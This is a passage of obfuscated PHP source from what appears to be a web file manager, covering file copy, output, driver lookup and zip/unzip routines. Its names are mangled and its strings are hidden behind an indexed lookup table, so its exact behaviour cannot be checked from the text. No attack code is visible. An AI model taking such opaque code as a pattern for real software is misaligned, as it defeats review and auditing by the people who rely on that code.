Ê, $²ÅË•Ÿ­, $‚£ôŒªá); self::copyMoveKeepInfo($¯úâ€¶ü, $Å €„¢ê, $‚£ôŒªá); return $‚£ôŒªá; } private static function copyMoveKeepInfo($İªÖ®óÇ, $ã›âîÁš, $õ¿áˆ®ä) { if (!$õ¿áˆ®ä) { return; } $Šè¯¾¸‡ = $İªÖ®óÇ->info($ã›âîÁš); if (!is_array($Šè¯¾¸‡)) { return; } IO::setModifyTime($õ¿áˆ®ä, $Šè¯¾¸‡[$_SERVER[°‰†òö¯][88]]); } public static function pathFather($µÃ«¢Ñğ) { $ÔÅÜùæ¾ = IO::init($µÃ«¢Ñğ); $ÙÃÒÆ±¹ = $ÔÅÜùæ¾->pathFather($ÔÅÜùæ¾->path); return $ÔÅÜùæ¾->getPathOuter($ÙÃÒÆ±¹); } public static function fileOut($ãş§¿ã³, $›¬»Ä†ê = false, $Æõ¿ç‡ = false, $¤íÌ… = '') { $Âóõ¯˜ = self::driverMake($ãş§¿ã³); if ($Âóõ¯˜->isFileOutServer()) { return $Âóõ¯˜->fileOutServer($ãş§¿ã³, $›¬»Ä†ê, $Æõ¿ç‡, $¤íÌ…); } return $Âóõ¯˜->fileOut($ãş§¿ã³, $›¬»Ä†ê, $Æõ¿ç‡, $¤íÌ…); } public static function fileOutImage($óš–ìù­, $ëûÎŒ¯Œ = 250) { $ŠÜ†àè = array(250, 600, 1200, 2000, 3000, 5000); for ($„â£¿ÑÅ = 0; $„â£¿ÑÅ < count($ŠÜ†àè); $„â£¿ÑÅ++) { if ($„â£¿ÑÅ == 0 && $ëûÎŒ¯Œ <= $ŠÜ†àè[$„â£¿ÑÅ]) { $ëûÎŒ¯Œ = $ŠÜ†àè[$„â£¿ÑÅ]; break; } else { if ($ëûÎŒ¯Œ > $ŠÜ†àè[$„â£¿ÑÅ - 1] && $ëûÎŒ¯Œ <= $ŠÜ†àè[$„â£¿ÑÅ]) { $ëûÎŒ¯Œ = $ŠÜ†àè[$„â£¿ÑÅ]; break; } else { if ($„â£¿ÑÅ == count($ŠÜ†àè) - 1 && $ëûÎŒ¯Œ > $ŠÜ†àè[$„â£¿ÑÅ]) { $ëûÎŒ¯Œ = $ŠÜ†àè[$„â£¿ÑÅ]; break; } } } } $Š†§ÁŠÆ = self::driverMake($óš–ìù­); if ($Š†§ÁŠÆ->isFileOutServer()) { return $Š†§ÁŠÆ->fileOutImageServer($óš–ìù­, $ëûÎŒ¯Œ); } return $Š†§ÁŠÆ->fileOutImage($óš–ìù­, $ëûÎŒ¯Œ); } private static function driverIsSame($˜Äƒ¾ö«, $ªôúÓ¶†) { $ÆÊÒ†Åá =& $_SERVER[°‰†òö¯]; $¤›ñŒŞë = $˜Äƒ¾ö«->getType(); $¯‡àÁş¨ = $ªôúÓ¶†->getType(); if ($¤›ñŒŞë != $¯‡àÁş¨) { return !1; } if ($¤›ñŒŞë == $ÆÊÒ†Åá[818]) { return !0; } if ($¤›ñŒŞë == $ÆÊÒ†Åá[109]) { return !0; } if ($˜Äƒ¾ö«->pathDriver == $ªôúÓ¶†->pathDriver) { return !0; } return !1; } public static function copyUpdate($ŸòÂµùÍ, $Î™‰ÆæÁ) { $«Ñ ñ‚Ô =& $_SERVER[°‰†òö¯]; if (!IO::exist($ŸòÂµùÍ)) { return !1; } if (!IO::exist($Î™‰ÆæÁ)) { IO::mkdir($Î™‰ÆæÁ); } $ğ«øÇÄ = array_to_keyvalue(self::listAllSimple($ŸòÂµùÍ), $«Ñ ñ‚Ô[87]); $ÏÌğ¸·Í = array_to_keyvalue(self::listAllSimple($Î™‰ÆæÁ), $«Ñ ñ‚Ô[87]); $„ññ¢»™ = array(); $ÛŠòæø“ = array(); foreach ($ğ«øÇÄ as $ã†ÒÄõı => $È’Ø¢À’) { if (isset($ÏÌğ¸·Í[$ã†ÒÄõı])) { if ($È’Ø¢À’[$«Ñ ñ‚Ô[78]] == 1) { continue; } if ($ÏÌğ¸·Í[$ã†ÒÄõı][$«Ñ ñ‚Ô[79]] == $È’Ø¢À’[$«Ñ ñ‚Ô[79]]) { continue; } } if ($È’Ø¢À’[$«Ñ ñ‚Ô[78]] == 1) { $ÛŠòæø“[] = $Î™‰ÆæÁ . $«Ñ ñ‚Ô[8] . trim($ã†ÒÄõı, $«Ñ ñ‚Ô[8]); continue; } $Ÿ†ÃØØ™ = strstr(trim($ã†ÒÄõı, $«Ñ ñ‚Ô[8]), $«Ñ ñ‚Ô[8]) ? get_path_father($ã†ÒÄõı) : $«Ñ ñ‚Ô[12]; $„ññ¢»™[] = array($«Ñ ñ‚Ô[1239] => $È’Ø¢À’[$«Ñ ñ‚Ô[89]], $«Ñ ñ‚Ô[1240] => rtrim($Î™‰ÆæÁ, $«Ñ ñ‚Ô[8]) . $«Ñ ñ‚Ô[8] . $Ÿ†ÃØØ™, $«Ñ ñ‚Ô[1241] => $È’Ø¢À’); } $‚ŞÀà¬Ò = array($«Ñ ñ‚Ô[232] => $„ññ¢»™, $«Ñ ñ‚Ô[78] => $ÛŠòæø“); Hook::trigger($«Ñ ñ‚Ô[1242], $ŸòÂµùÍ, $Î™‰ÆæÁ, $‚ŞÀà¬Ò); foreach ($ÛŠòæø“ as $È’Ø¢À’) { IO::mkdir($È’Ø¢À’); } foreach ($„ññ¢»™ as $È’Ø¢À’) { IO::copy($È’Ø¢À’[$«Ñ ñ‚Ô[1239]], $È’Ø¢À’[$«Ñ ñ‚Ô[1240]], REPEAT_REPLACE); } } public static function fileSubstr($¿ˆì˜˜Ù, $™É²¹ºı, $¿è Â§Í = false) { $ó°ÛÎÈ =& $_SERVER[°‰†òö¯]; $Æø°œğ¿ = self::driverMake($¿ˆì˜˜Ù); $ÊÏ¼øÁ = $Æø°œğ¿->size($¿ˆì˜˜Ù); $ÕêØò = $™É²¹ºı; $ÜÑ½ä¶Ú = $¿è Â§Í; if ($™É²¹ºı < 0) { $™É²¹ºı = $ÊÏ¼øÁ + $™É²¹ºı; } if ($¿è Â§Í === !1) { $¿è Â§Í = $ÊÏ¼øÁ - $™É²¹ºı; } if ($™É²¹ºı + $¿è Â§Í > $ÊÏ¼øÁ) { $¿è Â§Í = $ÊÏ¼øÁ - $™É²¹ºı; } if (!$ÊÏ¼øÁ && $Æø°œğ¿->getType() == $ó°ÛÎÈ[109] && !$Æø°œğ¿->exist($¿ˆì˜˜Ù)) { $ÂãÙº = get_path_this($¿ˆì˜˜Ù); $Ñ²È¼é = parse_url_query($ÂãÙº); if (is_array($Ñ²È¼é) && isset($Ñ²È¼é[$ó°ÛÎÈ[32]])) { $ÂãÙº = urldecode($Ñ²È¼é[$ó°ÛÎÈ[32]]); } throw new Exception($ó°ÛÎÈ[1243] . LNG($ó°ÛÎÈ[1244]) . $ó°ÛÎÈ[1041] . clear_html($ÂãÙº) . $ó°ÛÎÈ[12]); } if ($¿è Â§Í <= 0) { return $ó°ÛÎÈ[12]; } if ($™É²¹ºı < 0 || $™É²¹ºı >= $ÊÏ¼øÁ || $¿è Â§Í > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\122\x65\141\x64\40\145\x72\162\157\x72\x21\40\x73\164\141\x72\x74\x3d{$™É²¹ºı}\x3b\x6c\145\x6e\x67\x74\150\75{$¿è Â§Í}\x3b\x20\x73\151\172\x65\75{$ÊÏ¼øÁ}\73"); } $‹€øÎŞÙ = $Æø°œğ¿->fileSubstr($¿ˆì˜˜Ù, $™É²¹ºı, $¿è Â§Í); if (!$‹€øÎŞÙ && $¿è Â§Í && isset($GLOBALS[$ó°ÛÎÈ[1245]])) { throw new Exception($GLOBALS[$ó°ÛÎÈ[1245]][$ó°ÛÎÈ[1246]]); } return $‹€øÎŞÙ; } private static function driverMake(&$Ü¯ğ¥‘ú) { $á§à×ÚÆ =& $_SERVER[°‰†òö¯]; $íğ×¾­€ = KodIO::parse($Ü¯ğ¥‘ú); if (!self::$driverListSystem) { $ƒÁÅ¶ = Model($á§à×ÚÆ[828])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ƒÁÅ¶, $á§à×ÚÆ[477]); } if ($íğ×¾­€[$á§à×ÚÆ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$íğ×¾­€[$á§à×ÚÆ[477]]]) { throw new Exception($á§à×ÚÆ[1247]); return !1; } $Ü¯ğ¥‘ú = $íğ×¾­€[$á§à×ÚÆ[1248]]; $ÆŸÖÇ© = self::driverGet($íğ×¾­€, $Ü¯ğ¥‘ú); return $ÆŸÖÇ©; } private static function driverGet($ßëş©‡, &$£ÜõŞ‡) { $èÛŸ¦û» =& $_SERVER[°‰†òö¯]; $Ááá¦•À = $ßëş©‡[$èÛŸ¦û»[1249]]; $Ãæéí¯ = $ßëş©‡[$èÛŸ¦û»[477]]; switch ($ßëş©‡[$èÛŸ¦û»[33]]) { case KodIO::KOD_IO: $Ó‘½â¾Æ = self::$driverListSystem[$Ãæéí¯]; break; case KodIO::KOD_SOURCE: $£ÜõŞ‡ = $Ãæéí¯ . $£ÜõŞ‡; $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1251], $èÛŸ¦û»[6] => $ßëş©‡); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÁÍ»±® = $GLOBALS[$èÛŸ¦û»[1252]]; self::$driverListUser = array_to_keyvalue($ÁÍ»±®, $èÛŸ¦û»[477]); } $Ó‘½â¾Æ = self::$driverListUser[$Ãæéí¯]; break; case KodIO::KOD_SHARE_LINK: $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1253], $èÛŸ¦û»[6] => $ßëş©‡); $ÎÆí©åï = Action($èÛŸ¦û»[1254])->sharePathInfo($ßëş©‡[$èÛŸ¦û»[87]]); $£ÜõŞ‡ = $ÎÆí©åï[$èÛŸ¦û»[193]]; if (!$ÎÆí©åï[$èÛŸ¦û»[193]]) { $ÏÌ´•­À = Model($èÛŸ¦û»[671])->getInfo($ÎÆí©åï[$èÛŸ¦û»[672]]); $£ÜõŞ‡ = KodIO::clear($ÏÌ´•­À[$èÛŸ¦û»[1255]] . $ßëş©‡[$èÛŸ¦û»[1248]]); $ßëş©‡[$èÛŸ¦û»[564]] = $ÏÌ´•­À; $ßëş©‡[$èÛŸ¦û»[1230]] = $£ÜõŞ‡; $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1256], $èÛŸ¦û»[6] => $ßëş©‡); } break; case KodIO::KOD_SHARE_ITEM: $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1257], $èÛŸ¦û»[6] => $ßëş©‡); $ÏÌ´•­À = Model($èÛŸ¦û»[671])->getInfo($ßëş©‡[$èÛŸ¦û»[477]]); if ($ÏÌ´•­À[$èÛŸ¦û»[193]] == $èÛŸ¦û»[230]) { $£ÜõŞ‡ = KodIO::clear($ÏÌ´•­À[$èÛŸ¦û»[1255]] . $ßëş©‡[$èÛŸ¦û»[1248]]); $ßëş©‡[$èÛŸ¦û»[564]] = $ÏÌ´•­À; $ßëş©‡[$èÛŸ¦û»[1230]] = $£ÜõŞ‡; $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1258], $èÛŸ¦û»[6] => $ßëş©‡); } else { if (!$£ÜõŞ‡) { $£ÜõŞ‡ = $ÏÌ´•­À[$èÛŸ¦û»[193]]; } } break; default: $£ÜõŞ‡ = $ßëş©‡[$èÛŸ¦û»[87]]; $Ó‘½â¾Æ = array($èÛŸ¦û»[1250] => $èÛŸ¦û»[1259]); break; } $ƒ‚úÏ“š = $ßëş©‡[$èÛŸ¦û»[87]]; if (!isset(self::$driverCache[$ƒ‚úÏ“š])) { $º¬îıô÷ = strtolower($Ó‘½â¾Æ[$èÛŸ¦û»[98]]); $ûÔƒ´•¼ = $GLOBALS[$èÛŸ¦û»[6]][$èÛŸ¦û»[92]][$èÛŸ¦û»[892]]; $¬¡˜øÏ = $èÛŸ¦û»[77] . (isset($ûÔƒ´•¼[$º¬îıô÷]) ? $ûÔƒ´•¼[$º¬îıô÷] : ucfirst($º¬îıô÷)); if (!class_exists($¬¡˜øÏ)) { show_json("{$¬¡˜øÏ}\x20\156\x6f\x74\40\145\x78\151\163\164\x73\41", !1); } $ÌÀê§”ı = isset($Ó‘½â¾Æ[$èÛŸ¦û»[6]]) ? $Ó‘½â¾Æ[$èÛŸ¦û»[6]] : !1; self::$driverCache[$ƒ‚úÏ“š] = new $¬¡˜øÏ($ÌÀê§”ı); } $·€İÈŞĞ = self::$driverCache[$ƒ‚úÏ“š]; $·€İÈŞĞ->pathDriver = $Ááá¦•À; $·€İÈŞĞ->pathBase = $èÛŸ¦û»[12]; if (isset($Ó‘½â¾Æ[$èÛŸ¦û»[6]][$èÛŸ¦û»[1260]])) { $·€İÈŞĞ->pathBase = rtrim($Ó‘½â¾Æ[$èÛŸ¦û»[6]][$èÛŸ¦û»[1260]], $èÛŸ¦û»[8]) . $èÛŸ¦û»[8]; $£ÜõŞ‡ = $·€İÈŞĞ->pathBase . ltrim($£ÜõŞ‡, $èÛŸ¦û»[8]); } $£ÜõŞ‡ = $·€İÈŞĞ->getPath($£ÜõŞ‡); if (isset($ßëş©‡[$èÛŸ¦û»[1230]])) { $£ÜõŞ‡ = $ßëş©‡[$èÛŸ¦û»[1230]]; } $·€İÈŞĞ->path = $£ÜõŞ‡; return $·€İÈŞĞ; } public static function errorTips($ÀŠ‡Ğ­µ = false) { $ÓÂßÄß¶ =& $_SERVER[°‰†òö¯]; static $©şãŞ½ = array(); $£–Å Ø½ = 1000; if ($ÀŠ‡Ğ­µ === -1) { return $©şãŞ½ ? $©şãŞ½[count($©şãŞ½) - 1] : $ÓÂßÄß¶[12]; } if ($ÀŠ‡Ğ­µ === !1) { return implode($ÓÂßÄß¶[287], $©şãŞ½); } if (count($©şãŞ½) >= $£–Å Ø½) { $©şãŞ½ = array_slice($©şãŞ½, $£–Å Ø½ * 0.5, $£–Å Ø½); } $©şãŞ½[] = $ÀŠ‡Ğ­µ; write_log($ÓÂßÄß¶[176] . ACTION . $ÓÂßÄß¶[1261] . $ÀŠ‡Ğ­µ, $ÓÂßÄß¶[1262]); } public static function getLastError($ë±·ÜŸº = '') { $ÁšŠæº¥ = self::errorTips(-1); return $ÁšŠæº¥ ? $ÁšŠæº¥ : $ë±·ÜŸº; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $´ñç¥•š; if ($´ñç¥•š) { return $´ñç¥•š; } $ü¹ò÷Ø½ = IO::init($_SERVER[°‰†òö¯][8]); return $ü¹ò÷Ø½; } private static function iconvSystem($™æŸ¯™¦) { return self::local()->iconvSystem($™æŸ¯™¦); } private static function iconvApp($ùäé…¶Ÿ) { return self::local()->iconvApp($ùäé…¶Ÿ); } public static function zipFolder($·‘Ìª³´, $éÓ´°¥ = "\172\151\x70", $Šä‰§ô = '', $æ¤’Æš = REPEAT_RENAME) { $—üÏÎš˜ =& $_SERVER[°‰†òö¯]; $şè¨ÊÀ± = IO::listPath($·‘Ìª³´); if (!$şè¨ÊÀ±) { return !1; } $şè¨ÊÀ± = array_merge($şè¨ÊÀ±[$—üÏÎš˜[85]], $şè¨ÊÀ±[$—üÏÎš˜[86]]); return self::zip($şè¨ÊÀ±, $éÓ´°¥, $Šä‰§ô, $æ¤’Æš); } public static function zip($¾ÁÄæÚ…, $•å‘ ¨É = "\x7a\151\x70", $İ…µõ”µ = '', $áŒüç–› = REPEAT_RENAME) { $í¶ü¢¾˜ =& $_SERVER[°‰†òö¯]; if (is_string($¾ÁÄæÚ…) && $¾ÁÄæÚ…) { $¾ÁÄæÚ… = array(array($í¶ü¢¾˜[87] => $¾ÁÄæÚ…)); } $‚Û¨ÀúÔ = self::init($¾ÁÄæÚ…[0][$í¶ü¢¾˜[87]]); $ø’×™‚‡ = self::info($¾ÁÄæÚ…[0][$í¶ü¢¾˜[87]]); $¿ôÙÕˆ = $í¶ü¢¾˜[12]; $íµ½úŠú = $í¶ü¢¾˜[12]; $‰ È‹Éë = $í¶ü¢¾˜[12]; if ($İ…µõ”µ && substr($İ…µõ”µ, -1, 1) != $í¶ü¢¾˜[8]) { $íµ½úŠú = get_path_father($İ…µõ”µ); $‰ È‹Éë = get_path_this($İ…µõ”µ); } else { $íµ½úŠú = self::pathFather($ø’×™‚‡[$í¶ü¢¾˜[87]]); $‰ È‹Éë = $ø’×™‚‡[$í¶ü¢¾˜[32]] . $í¶ü¢¾˜[10] . $•å‘ ¨É; if (count($¾ÁÄæÚ…) > 1) { $ã×…³àó = IO::info($íµ½úŠú); $‰ È‹Éë = $ã×…³àó[$í¶ü¢¾˜[32]] . $í¶ü¢¾˜[10] . $•å‘ ¨É; } if ($İ…µõ”µ) { $íµ½úŠú = $İ…µõ”µ; } } if ($‚Û¨ÀúÔ->getType() == $í¶ü¢¾˜[109]) { $ı¸£¡ÎŸ = self::init($íµ½úŠú); $ãò­©”à = $ı¸£¡ÎŸ->getType() == $í¶ü¢¾˜[109] ? $íµ½úŠú : get_path_father($‚Û¨ÀúÔ->path); $ãò­©”à = IO::getPathInner($ãò­©”à); $ãò­©”à = rtrim($ãò­©”à, $í¶ü¢¾˜[8]) . $í¶ü¢¾˜[8]; mk_dir($ãò­©”à); } else { $¿ôÙÕˆ = TEMP_FILES . $í¶ü¢¾˜[1263] . time() . rand_string(8) . $í¶ü¢¾˜[8]; mk_dir($¿ôÙÕˆ); file_put_contents($¿ôÙÕˆ . $í¶ü¢¾˜[1264], $í¶ü¢¾˜[12]); $ãò­©”à = $¿ôÙÕˆ; } $Š²ùÄùç = IO::info($ãò­©”à); if (!$Š²ùÄùç || !$Š²ùÄùç[$í¶ü¢¾˜[235]]) { show_json(LNG($í¶ü¢¾˜[1265]), !1); } $¹Å€­”¦ = self::zipFileList($¾ÁÄæÚ…, $¿ôÙÕˆ); foreach ($¹Å€­”¦ as $áÌ¢º¸ñ => $–ú ˆ§¥) { $¹Å€­”¦[$áÌ¢º¸ñ] = self::iconvSystem($–ú ˆ§¥); } $¶ãÇø‹² = get_filename_auto($ãò­©”à . $‰ È‹Éë, $í¶ü¢¾˜[12], $áŒüç–›); KodArchive::create(self::iconvSystem($¶ãÇø‹²), $¹Å€­”¦); if (!IO::exist($¶ãÇø‹²)) { if ($¿ôÙÕˆ) { del_dir($¿ôÙÕˆ); } write_log($í¶ü¢¾˜[1266] . $¶ãÇø‹², $í¶ü¢¾˜[390]); show_json(LNG($í¶ü¢¾˜[1267]), !1); } if (!$¿ôÙÕˆ) { return $¶ãÇø‹²; } $Ç›ÂïÄ = self::move($¶ãÇø‹², $íµ½úŠú, $áŒüç–›); if ($¿ôÙÕˆ) { del_dir($¿ôÙÕˆ); } if (!$¶ãÇø‹²) { write_log($í¶ü¢¾˜[1268] . $¶ãÇø‹² . $í¶ü¢¾˜[1269] . $íµ½úŠú, $í¶ü¢¾˜[390]); show_json(LNG($í¶ü¢¾˜[1267]), !1); } return $Ç›ÂïÄ; } public static function unzip($‘ëúÀ“, $«”£×™İ, $¹Æ‡œæø = "\55\61", $–±­ùÖÁ = "\x72\x65\160\154\141\143\x65") { $Ÿ³Âö§¾ =& $_SERVER[°‰†òö¯]; $È‚Œ¸ê’ = parent::info($‘ëúÀ“); if (!$È‚Œ¸ê’) { show_json(LNG($Ÿ³Âö§¾[1270]), !1); } $òàŸµş = IO::infoFullSimple($«”£×™İ); if (!$òàŸµş) { $«”£×™İ = IO::mkdir($«”£×™İ); } if (isset($òàŸµş[$Ÿ³Âö§¾[193]]) && trim($òàŸµş[$Ÿ³Âö§¾[87]], $Ÿ³Âö§¾[8]) != trim($«”£×™İ, $Ÿ³Âö§¾[8])) { $©’‹¬ = KodIO::make($òàŸµş[$Ÿ³Âö§¾[192]]); $‘ëõ‰ª = IO::fileNameAuto($©’‹¬, $òàŸµş[$Ÿ³Âö§¾[32]], REPEAT_RENAME_FOLDER, !0); $«”£×™İ = IO::mkdir($©’‹¬ . $‘ëõ‰ª); } $¹Æ‡œæø = $¹Æ‡œæø && $¹Æ‡œæø != $Ÿ³Âö§¾[1271] ? @json_decode($¹Æ‡œæø, !0) : -1; $ÍÑ—ºúğ = self::unzipPart($‘ëúÀ“, $¹Æ‡œæø); if (!$ÍÑ—ºúğ || !IO::exist($ÍÑ—ºúğ[$Ÿ³Âö§¾[232]])) { show_json(LNG($Ÿ³Âö§¾[108]), !1); } $èŠ»¿ = $ÍÑ—ºúğ[$Ÿ³Âö§¾[1272]][count($ÍÑ—ºúğ[$Ÿ³Âö§¾[1272]]) - 1]; if ($èŠ»¿[$Ÿ³Âö§¾[1273]] == -1 || substr($èŠ»¿[$Ÿ³Âö§¾[32]], -1, 1) == $Ÿ³Âö§¾[8]) { $ïĞ •Óİ = $ÍÑ—ºúğ[$Ÿ³Âö§¾[1274]] . rand_string(10) . $Ÿ³Âö§¾[8]; mk_dir($ïĞ •Óİ); $ç˜•Ü¤Í = count($ÍÑ—ºúğ[$Ÿ³Âö§¾[1272]]) == 1 ? IO::ext($‘ëúÀ“) : get_path_ext($ÍÑ—ºúğ[$Ÿ³Âö§¾[232]]); $´šúäŠ¶ = KodArchive::extract(self::iconvSystem($ÍÑ—ºúğ[$Ÿ³Âö§¾[232]]), $ïĞ •Óİ, $èŠ»¿[$Ÿ³Âö§¾[1273]], $‘ëõ‰ª, $ç˜•Ü¤Í); self::unzipErrorCheck($´šúäŠ¶, array($Ÿ³Âö§¾[1275], $‘ëúÀ“, $ç˜•Ü¤Í, $«”£×™İ, $ÍÑ—ºúğ)); Hook::trigger($Ÿ³Âö§¾[1276], $ïĞ •Óİ); recursion_dir($ïĞ •Óİ, $—ıáÉ®š, $ëàÀá ², 0); $ÁåáÔ« = array_merge($—ıáÉ®š, $ëàÀá ²); $…·†Ñ¿ = array(); foreach ($ÁåáÔ« as $ÖÄ»õ˜İ) { $âÚÚàñ = IO::move(self::iconvApp($ÖÄ»õ˜İ), $«”£×™İ, $–±­ùÖÁ); if ($âÚÚàñ) { $…·†Ñ¿[] = $âÚÚàñ; } } del_dir($ïĞ •Óİ); } else { $âÚÚàñ = IO::move($ÍÑ—ºúğ[$Ÿ³Âö§¾[232]], $«”£×™İ, $–±­ùÖÁ, get_path_this($èŠ»¿[$Ÿ³Âö§¾[32]])); if ($âÚÚàñ) { $…·†Ñ¿[] = $âÚÚàñ; } } return $…·†Ñ¿ ? $…·†Ñ¿ : !1; } public static function unzipList($¦€ºŒÇ) { $Ÿ†Ò‚¨ò =& $_SERVER[°‰†òö¯]; $°ÄÎóÂ = isset($¦€ºŒÇ[$Ÿ†Ò‚¨ò[1277]]) ? $¦€ºŒÇ[$Ÿ†Ò‚¨ò[1277]] : !1; $ßç½¿¶å = isset($¦€ºŒÇ[$Ÿ†Ò‚¨ò[1273]]) ? @json_decode($¦€ºŒÇ[$Ÿ†Ò‚¨ò[1273]], !0) : -1; $Â¼ä³“Ô = self::unzipPart($¦€ºŒÇ[$Ÿ†Ò‚¨ò[87]], $ßç½¿¶å); if (!$Â¼ä³“Ô || !IO::exist($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]])) { show_json(LNG($Ÿ†Ò‚¨ò[108]), !1); } $À†ÚîÌ = $Â¼ä³“Ô[$Ÿ†Ò‚¨ò[1272]][count($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[1272]]) - 1]; $™¨½¹Ùµ = in_array(IO::ext($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]]), array($Ÿ†Ò‚¨ò[390], $Ÿ†Ò‚¨ò[1278], $Ÿ†Ò‚¨ò[1279], $Ÿ†Ò‚¨ò[1280], $Ÿ†Ò‚¨ò[1281], $Ÿ†Ò‚¨ò[1282])); if (!$°ÄÎóÂ && ($À†ÚîÌ[$Ÿ†Ò‚¨ò[1273]] == -1 || $™¨½¹Ùµ)) { $‡Šã×Ä¤ = $Â¼ä³“Ô[$Ÿ†Ò‚¨ò[1274]] . get_path_this($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]]) . $Ÿ†Ò‚¨ò[1283]; if (!IO::exist($‡Šã×Ä¤)) { $Îßæ±ØÃ = $À†ÚîÌ[$Ÿ†Ò‚¨ò[1273]] == -1 ? get_path_ext(IO::pathThis($¦€ºŒÇ[$Ÿ†Ò‚¨ò[87]])) : get_path_ext($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]]); $¡‡¡§½É = KodArchive::listContent(self::iconvSystem($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]]), !0, $Îßæ±ØÃ); self::unzipErrorCheck($¡‡¡§½É, array($Ÿ†Ò‚¨ò[1284], $¦€ºŒÇ, $Â¼ä³“Ô)); @file_put_contents($‡Šã×Ä¤, json_encode($¡‡¡§½É[$Ÿ†Ò‚¨ò[1285]])); } return @json_decode(IO::getContent($‡Šã×Ä¤), !0); } IO::fileOut($Â¼ä³“Ô[$Ÿ†Ò‚¨ò[232]], $°ÄÎóÂ, get_path_this($À†ÚîÌ[$Ÿ†Ò‚¨ò[32]])); die; } private static function zipFileList($‹õİ‚, $¥µ‡Çíê = false) { $Ò½×ïÔ† =& $_SERVER[°‰†òö¯]; $ëÍå¶…¹ = array(); foreach ($‹õİ‚ as $×©ÚùÜ­) { $…´Ş©¨Ç = $×©ÚùÜ­[$Ò½×ïÔ†[87]]; if ($¥µ‡Çíê) { $…´Ş©¨Ç = self::copy($×©ÚùÜ­[$Ò½×ïÔ†[87]], $¥µ‡Çíê, $Ò½×ïÔ†[885]); } else { $Öíşõ— = self::init($×©ÚùÜ­[$Ò½×ïÔ†[87]]); if ($Öíşõ—->getType() == $Ò½×ïÔ†[109]) { $…´Ş©¨Ç = $Öíşõ—->path; } } if ($…´Ş©¨Ç && self::local()->exist($…´Ş©¨Ç)) { $ëÍå¶…¹[$×©ÚùÜ­[$Ò½×ïÔ†[87]]] = $…´Ş©¨Ç; } } if (!empty($ëÍå¶…¹)) { return array_values($ëÍå¶…¹); } show_json(LNG($Ò½×ïÔ†[1244]), !1); } private static function localFilePath($ıŞıÊñ) { $¨±²ËÍŒ =& $_SERVER[°‰†òö¯]; $¶¤ÚŸã¦ = KodIO::parse($ıŞıÊñ); if ($¶¤ÚŸã¦[$¨±²ËÍŒ[33]] == KodIO::KOD_SOURCE) { $¾®‰¡Î¼ = Model($¨±²ËÍŒ[891])->fileInfoGet(KodIO::sourceID($ıŞıÊñ)); if (!$¾®‰¡Î¼[$¨±²ËÍŒ[87]]) { show_json($¨±²ËÍŒ[1286], !1); } $ıŞıÊñ = $¾®‰¡Î¼[$¨±²ËÍŒ[87]]; } $ƒë—™»  = self::init($ıŞıÊñ); if ($ƒë—™» ->pathParse[$¨±²ËÍŒ[1230]]) { $ıŞıÊñ = $ƒë—™» ->pathParse[$¨±²ËÍŒ[1230]]; $ƒë—™»  = self::init($ıŞıÊñ); } $Ì—­ãªä = $ƒë—™» ->getType(); if ($Ì—­ãªä == $¨±²ËÍŒ[109] || $Ì—­ãªä == $¨±²ËÍŒ[1287]) { if (!$ƒë—™» ->exist($ƒë—™» ->path)) { show_json(LNG($¨±²ËÍŒ[108]), !1); } return $ƒë—™» ->path; } return !1; } public static function unzipPart($ûÍ°¼ğó, $¾Ò¬ª‚ò = -1) { $¾¦˜”§ú =& $_SERVER[°‰†òö¯]; $à¿Ü–€ = IO::pathThis($ûÍ°¼ğó); if (!$¾Ò¬ª‚ò || $¾Ò¬ª‚ò == -1) { $ÅÎè©÷ = array(array($¾¦˜”§ú[32] => $à¿Ü–€, $¾¦˜”§ú[1273] => -1)); $ÅÎè©÷[0][$¾¦˜”§ú[1288]] = $ÅÎè©÷[0][$¾¦˜”§ú[32]]; } else { if (is_array($¾Ò¬ª‚ò)) { $ÅÎè©÷ = $¾Ò¬ª‚ò; $æµÛ = count($ÅÎè©÷) - 1; for ($Ïè‘Ôİ¯ = 0; $Ïè‘Ôİ¯ <= $æµÛ; $Ïè‘Ôİ¯++) { $’½ƒÊŒ« = $ÅÎè©÷[$Ïè‘Ôİ¯]; $™Ğ–¬Ä• = get_path_this($’½ƒÊŒ«[$¾¦˜”§ú[32]]) . (checkExtSafe($’½ƒÊŒ«[$¾¦˜”§ú[32]]) ? $¾¦˜”§ú[12] : $¾¦˜”§ú[1289]); $ÅÎè©÷[$Ïè‘Ôİ¯][$¾¦˜”§ú[1288]] = $¾¦˜”§ú[1290] . intval($’½ƒÊŒ«[$¾¦˜”§ú[1273]]) . $¾¦˜”§ú[464] . $™Ğ–¬Ä•; if ($Ïè‘Ôİ¯ == 0) { continue; } $ÅÎè©÷[$Ïè‘Ôİ¯][$¾¦˜”§ú[1288]] = $ÅÎè©÷[$Ïè‘Ôİ¯ - 1][$¾¦˜”§ú[1288]] . $¾¦˜”§ú[1291] . $ÅÎè©÷[$Ïè‘Ôİ¯][$¾¦˜”§ú[1288]]; } } } if (!is_array($ÅÎè©÷) || count($ÅÎè©÷) == 0) { return !1; } $âœ­È¡Š = $ÅÎè©÷[count($ÅÎè©÷) - 1]; if (!IO::exist($ûÍ°¼ğó)) { return !1; } $úÂ÷‡‚ê = TEMP_FILES . $¾¦˜”§ú[1292] . kodIO::hashPathSafe($ûÍ°¼ğó) . $¾¦˜”§ú[8]; $ğ÷™šñâ = $úÂ÷‡‚ê . $âœ­È¡Š[$¾¦˜”§ú[1288]]; mk_dir($úÂ÷‡‚ê); file_put_contents(TEMP_FILES . $¾¦˜”§ú[1264], $¾¦˜”§ú[12]); if (IO::exist($ğ÷™šñâ)) { return array($¾¦˜”§ú[232] => $ğ÷™šñâ, $¾¦˜”§ú[1272] => $ÅÎè©÷, $¾¦˜”§ú[1274] => $úÂ÷‡‚ê); } $Ñ‚üå¼È = 